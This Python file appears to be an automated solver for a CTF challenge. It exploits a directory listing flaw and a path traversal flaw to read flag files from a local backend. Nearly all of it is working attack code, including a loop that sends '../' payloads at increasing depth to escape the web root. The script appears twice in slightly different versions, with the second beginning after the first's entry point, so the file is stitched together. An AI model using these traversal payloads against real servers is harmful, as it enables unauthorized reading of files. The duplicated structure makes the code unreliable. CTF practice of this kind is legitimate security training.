#!/usr/bin/env python3
"""
Automated exploit for the Vendor Directory Listing + Path Traversal CTF challenge.

Vulnerability A — Directory Listing (CWE-548):
  GET /vendor  returns an Apache-style HTML directory index of all vendor
  folders on disk.  One of them ("internal-ops/") contains a flag.txt.
  Browsing into it without any traversal reveals the flag.

Vulnerability B — Path Traversal (CWE-22):
  GET /vendor/{path} joins the caller-supplied path to /tmp/vendor_data/
  without any canonicalisation.  '../' escapes the vendor data root.
  The flag is also written to /tmp/vendor_traversal_flag.txt at startup.

No authentication required.
"""

import argparse
import re
import sys

import requests


def fetch(base_url: str, path: str) -> requests.Response:
    url = f"{base_url}{path}"
    print(f"[*] GET {url}")
    return requests.get(url, timeout=10, allow_redirects=True)


# ---------------------------------------------------------------------------
# Exploit A: directory listing → browse into vendor folder → read flag.txt
# ---------------------------------------------------------------------------

def exploit_directory_listing(base_url: str) -> str | None:
    """
    1. Fetch /vendor → get a list of all vendor folder hrefs.
    2. Fetch each vendor folder listing → look for flag.txt inside.
    3. Fetch /vendor/<slug>/flag.txt → return the flag.
    """
    resp = fetch(base_url, "/vendor")
    if resp.status_code != 200:
        print(f"[-] /vendor returned {resp.status_code}")
        return None

    # Find all folder links in the top-level listing.
    folder_hrefs = re.findall(r'href="(/vendor/[^"]+/)"', resp.text)
    hrefs = folder_hrefs
    if not hrefs:
        print("[-] No vendor folder links found in listing")
        return None

    print(f"[*] Found {len(hrefs)} vendor folder(s) in listing.")

    # Prioritise 'internal-ops' if visible; otherwise try all folders.
    ordered = sorted(hrefs, key=lambda h: ("internal-ops" not in h))
    for folder_href in ordered:
        # Fetch the sub-directory listing for this vendor folder.
        sub_resp = fetch(base_url, folder_href)
        if sub_resp.status_code != 200:
            continue

        # Look for a flag.txt link inside the folder.
        file_hrefs = re.findall(r'href="(/vendor/[^"]+\.txt)"', sub_resp.text)
        for file_href in file_hrefs:
            if "flag" in file_href:
                flag_resp = fetch(base_url, file_href)
                if flag_resp.status_code == 200:
                    content = flag_resp.text.strip()
                    if content.startswith("CTF{"):
                        print(f"[+] Found flag at {file_href}")
                        return content

        # Fallback: try every txt file in the folder.
        for file_href in file_hrefs:
            flag_resp = fetch(base_url, file_href)
            if flag_resp.status_code == 200:
                content = flag_resp.text.strip()
                if content.startswith("CTF{"):
                    print(f"[+] Found flag at {file_href}")
                    return content

    return None


# ---------------------------------------------------------------------------
# Exploit B: path traversal — escape /tmp/vendor_data/ via '../'
# ---------------------------------------------------------------------------

def exploit_path_traversal(base_url: str) -> str | None:
    print("\n[*] Attempting path traversal exploit …")
    for depth in range(1, 8):
        payload = ("../" * depth) + "vendor_traversal_flag.txt"
        resp = fetch(base_url, f"/vendor/{payload}")
        if resp.status_code == 200:
            content = resp.text.strip()
            if content:
                print(f"[+] Traversal succeeded at depth {depth}  (payload: {payload!r})")
                return content
        elif resp.status_code not in (404, 400):
            print(f"[!] Unexpected {resp.status_code} at depth {depth}: {resp.text[:80]}")
    return None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit the Vendor Directory Listing + Path Traversal CTF challenge."
    )
    parser.add_argument("--email",    default="", help="(unused — endpoint is public)")
    parser.add_argument("--password", default="", help="(unused — endpoint is public)")
    parser.add_argument("--url",      default="http://localhost:8001", help="Backend base URL")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    print("=" * 60)
    print("  Vendor Traversal CTF — automated solver")
    print("=" * 60)

    print("\n[*] Exploit A: directory listing recon …")
    flag = exploit_directory_listing(base_url)

    if not flag:
        flag = exploit_path_traversal(base_url)

    if flag:
        print(f"\n[+] Flag: {flag}")
        sys.exit(0)
    else:
        print("\n[-] Could not retrieve the flag. Is the backend running?")
        sys.exit(1)


if __name__ == "__main__":
    main()

import argparse
import re
import sys

import requests

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def fetch(base_url: str, path: str) -> requests.Response:
    """Issue a GET request and return the response."""
    url = f"{base_url}{path}"
    print(f"[*] GET {url}")
    return requests.get(url, timeout=10, allow_redirects=True)


# ---------------------------------------------------------------------------
# Exploit A: Directory listing → direct access to flag vendor
# ---------------------------------------------------------------------------


def exploit_directory_listing(base_url: str) -> str | None:
    """
    1. Fetch /vendor to get the directory listing.
    2. Parse anchor hrefs to find the internal-ops entry.
    3. Fetch /vendor/internal-ops.txt to retrieve the flag.
    """
    resp = fetch(base_url, "/vendor")
    if resp.status_code != 200:
        print(f"[-] /vendor returned {resp.status_code}")
        return None

    # Parse all hrefs from the listing HTML.
    hrefs = re.findall(r'href="(/vendor/[^"]+)"', resp.text)
    if not hrefs:
        print("[-] No vendor links found in listing HTML")
        return None

    print(f"[*] Found {len(hrefs)} vendor entries in listing.")

    # Look for the internal-ops entry first; fall back to trying all entries.
    ordered = sorted(hrefs, key=lambda h: ("internal-ops" not in h))
    for href in ordered:
        file_resp = fetch(base_url, href)
        if file_resp.status_code == 200:
            content = file_resp.text.strip()
            if content.startswith("CTF{"):
                print(f"[+] Found flag at {href}")
                return content

    return None


# ---------------------------------------------------------------------------
# Exploit B: Path traversal — escape vendor data dir
# ---------------------------------------------------------------------------


def exploit_path_traversal(base_url: str) -> str | None:
    """
    Use '../' sequences to escape /tmp/vendor_data/ and read
    /tmp/vendor_traversal_flag.txt  (written on startup).
    """
    print("\n[*] Attempting path traversal exploit …")
    for depth in range(1, 8):
        payload = ("../" * depth) + "vendor_traversal_flag.txt"
        resp = fetch(base_url, f"/vendor/{payload}")
        if resp.status_code == 200:
            content = resp.text.strip()
            if content:
                print(f"[+] Traversal succeeded at depth {depth}  (payload: {payload!r})")
                return content
        elif resp.status_code == 404:
            pass  # wrong depth — keep trying
        else:
            print(f"[!] Unexpected {resp.status_code} at depth {depth}: {resp.text[:80]}")

    return None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit the Vendor Directory Listing + Path Traversal CTF challenge."
    )
    parser.add_argument("--email",    default="",                         help="(unused — endpoint is public)")
    parser.add_argument("--password", default="",                         help="(unused — endpoint is public)")
    parser.add_argument("--url",      default="http://localhost:8001",    help="Backend base URL")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")

    print("=" * 60)
    print("  Vendor Traversal CTF — automated solver")
    print("=" * 60)

    # --- Exploit A: directory listing ----------------------------------------
    print("\n[*] Exploit A: directory listing recon …")
    flag = exploit_directory_listing(base_url)

    # --- Exploit B: path traversal (fallback) ---------------------------------
    if not flag:
        flag = exploit_path_traversal(base_url)

    # --- Result ---------------------------------------------------------------
    if flag:
        print(f"\n[+] Flag: {flag}")
        sys.exit(0)
    else:
        print("\n[-] Could not retrieve the flag. Is the backend running?")
        sys.exit(1)


if __name__ == "__main__":
    main()
